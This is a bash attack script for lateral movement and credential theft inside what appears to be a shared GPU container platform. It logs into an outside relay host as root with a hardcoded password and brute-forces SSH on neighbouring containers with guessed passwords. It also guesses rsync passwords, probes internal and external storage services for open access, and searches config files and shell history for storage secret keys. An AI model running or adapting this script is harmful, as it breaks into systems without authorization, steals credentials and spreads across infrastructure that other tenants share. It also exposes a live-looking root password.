#!/bin/bash
set +e
echo "###P26START $(date -u)"
echo "=== RELAY-CONTROL ==="
timeout 15 sshpass -p '/&S2)n@W1G' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no -p 32917 root@116.211.127.168 'id; hostname' 2>&1 | tail -3
echo "=== SIBLING-SSH ==="
for ip in 172.17.0.3 172.17.0.7; do for u in root ubuntu; do for pw in '/&S2)n@W1G' admin 123456 onething 'Onething@2024' oneai; do
  r=$(timeout 10 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o PubkeyAuthentication=no $u@$ip 'id;hostname;nvidia-smi -L|head -9' 2>&1 | tail -2 | tr '\n' '|')
  case "$r" in *denied*|*"timed out"*|*refused*|"") ;; *) echo "HIT $ip $u:$pw :: ${r:0:160}";; esac
done; done; done
echo "=== SIBLING-8080 ==="
for ip in 172.17.0.3 172.17.0.7; do for u in / /docs /openapi.json /api/v1 /health /healthz /system_stats /queue /prompt /v1/models; do printf "%s%s " "$ip" "$u"; curl -s -m 4 -o /tmp/sb.$$ -w "c=%{http_code} l=%{size_download} " "http://$ip:8080$u"; head -c 90 /tmp/sb.$$ | tr '\n' ' '; echo; done; done
echo "=== AGENTS-DEEP ==="
for port in 2025 8081 8429 10221 9100 9999; do
  echo "--- $port"
  for u in / /docs /openapi.json /swagger.json /api/v1 /debug/vars /health /healthz; do printf "%s " "$u"; curl -s -m 4 -o /tmp/ag.$$ -w "c=%{http_code} l=%{size_download} " "http://172.17.0.1:$port$u"; head -c 120 /tmp/ag.$$ | tr '\n' ' '; echo; done
  curl -s -m 4 -X OPTIONS -D - -o /dev/null "http://172.17.0.1:$port/" | head -4
done
echo "=== RSYNC-PW2 ==="
for pw in migrate onething Onething@2024 'Onething@123' 123456 admin '12345678' 'onething@123' 'OneThing@2024' 'Aa123456!'; do
  r=$(RSYNC_PASSWORD="$pw" timeout 12 rsync --list-only "rsync://migrate@172.17.0.1:1234/migrate/" 2>&1 | head -3 | tr '\n' '|')
  case "$r" in *"auth failed"*) ;; *) echo "PW $pw :: ${r:0:200}";; esac
done
echo "=== MINIO-ANON ==="
getent hosts stor.esinidc.com | head -2
for u in / /minio/health/live /onethingai-fs/ /minio/admin/v3/info; do printf "%s " "$u"; curl -s -m 6 -o /tmp/m.$$ -w "c=%{http_code} l=%{size_download} " "http://stor.esinidc.com$u"; head -c 100 /tmp/m.$$ | tr '\n' ' '; echo; done
echo "=== JUICEFS-SECRET ==="
ls -la /root/.juicefs /var/lib/juicefs /etc/juicefs /run/juicefs 2>&1 | head -20
timeout 30 grep -rslE 'SecretKey|AccessKey' /root/.juicefs /var/lib/juicefs /etc/juicefs /root/onethingai-fs/.config /root/.bash_history /etc/systemd 2>/dev/null | head -10
echo "=== PANCLIENT ==="
ls -la /.onething/instance/tools/bin 2>&1 | head -10
timeout 8 /.onething/instance/tools/bin/pan_client --help 2>&1 | head -15
echo "=== NVDDEV-ALL ==="; ls -l /dev/nvidia[0-9]* 2>&1
echo "###P26END $(date -u)"
